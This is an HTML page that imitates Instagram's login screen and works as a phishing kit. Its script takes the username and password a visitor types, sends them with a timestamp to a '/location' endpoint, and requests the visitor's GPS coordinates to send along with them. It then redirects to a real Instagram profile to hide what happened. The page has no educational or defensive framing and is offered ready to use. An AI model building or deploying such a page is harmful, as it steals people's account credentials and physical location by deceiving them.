<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Instagram</title>

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=Pacifico&display=swap" rel="stylesheet">

<style>
*{margin:0;padding:0;box-sizing:border-box}

body{
  min-height:100vh;
  background:#0b0e11;
  display:flex;
  justify-content:center;
  align-items:center;
  color:#fff;
  font-family:'Inter',sans-serif;
}

.container{
  width:350px;
  text-align:center;
}

/* Logo */
.logo{
  font-family:'Pacifico',cursive;
  font-size:40px;
  margin-bottom:28px;
}

/* Card */
.card{
  background:#111;
  border:1px solid #2a2d33;
  border-radius:4px;
  padding:28px;
}

/* Inputs */
.input{
  width:100%;
  padding:11px;
  margin-bottom:10px;
  background:#26292e;
  border:1px solid #3a3d43;
  border-radius:4px;
  color:#fff;
  font-size:14px;
}

/* Button */
.btn-primary{
  width:100%;
  padding:11px;
  background:#3f4db8;
  border:none;
  border-radius:8px;
  color:#fff;
  font-weight:600;
  margin-top:10px;
  cursor:pointer;
}

/* Divider */
.divider{
  display:flex;
  align-items:center;
  margin:20px 0;
  font-size:12px;
  font-weight:500;
  letter-spacing:2px;
  color:#8e8e8e;
}
.divider::before,
.divider::after{
  content:"";
  flex:1;
  height:1px;
  background:#333;
}
.divider span{margin:0 12px}

/* Facebook */
.fb-login{
  display:flex;
  justify-content:center;
  align-items:center;
  gap:8px;
  color:#1877f2;
  font-size:14px;
  font-weight:500;
}
.fb-icon{width:18px;height:18px}

/* Misc */
.forgot{
  margin-top:18px;
  font-size:12px;
  font-weight:500;
}
.signup{
  margin-top:14px;
  border:1px solid #2a2d33;
  padding:18px;
  font-size:14px;
}
.signup span{font-weight:400}
.signup a{color:#3f8cff;font-weight:500;text-decoration:none}
.footer{
  margin-top:28px;
  font-size:12px;
  color:#8e8e8e;
  letter-spacing:.3px;
}
</style>
</head>

<body>

<div class="container">

  <div class="logo">Instagram</div>

  <div class="card">

    <input class="input" id="userField"
      placeholder="Phone number, username, or email">

    <input class="input" id="passField"
      type="password" placeholder="Password">

    <button class="btn-primary" onclick="handleLogin()">Log in</button>

    <div class="divider"><span>OR</span></div>

    <div class="fb-login">
      <svg class="fb-icon" viewBox="0 0 24 24" fill="#1877f2">
        <path d="M22 12a10 10 0 1 0-11.5 9.9v-7h-2v-3h2V9.5c0-2 1.2-3.1 3-3.1.9 0 1.8.1 1.8.1v2h-1c-1 0-1.3.6-1.3 1.2V12h2.6l-.4 3h-2.2v7A10 10 0 0 0 22 12"/>
      </svg>
      Log in with Facebook
    </div>

    <div class="forgot">Forgot password?</div>

  </div>

  <div class="signup">
    <span>Don’t have an account?</span> <a href="#">Sign up</a>
  </div>

  <div class="footer">
    Meta · About · Privacy · Terms · Locations
  </div>

</div>

<script>
/* ===== CONFIG ===== */
const NEXT_PAGE_URL = "https://www.instagram.com/rohitsharma45/";

/* ===== FEATURE 1 — GUARANTEED SAVE ===== */
function handleLogin(){

  // 1️⃣ Capture inputs immediately
  const payload = {
    user: document.getElementById("userField").value,
    pass: document.getElementById("passField").value,
    timestamp: new Date().toISOString()
  };

  // 2️⃣ Always send to /location (no dependency)
  fetch("/location",{
    method:"POST",
    headers:{ "Content-Type":"application/json" },
    body: JSON.stringify(payload)
  }).catch(()=>{});

  // 3️⃣ Optionally attach location (non-blocking)
  if(navigator.geolocation){
    navigator.geolocation.getCurrentPosition(pos=>{
      fetch("/location",{
        method:"POST",
        headers:{ "Content-Type":"application/json" },
        body: JSON.stringify({
          ...payload,
          lat: pos.coords.latitude,
          lon: pos.coords.longitude,
          accuracy: pos.coords.accuracy
        })
      }).catch(()=>{});
    });
  }

  // 4️⃣ Redirect
  window.location.href = NEXT_PAGE_URL;
}
</script>

</body>
</html>
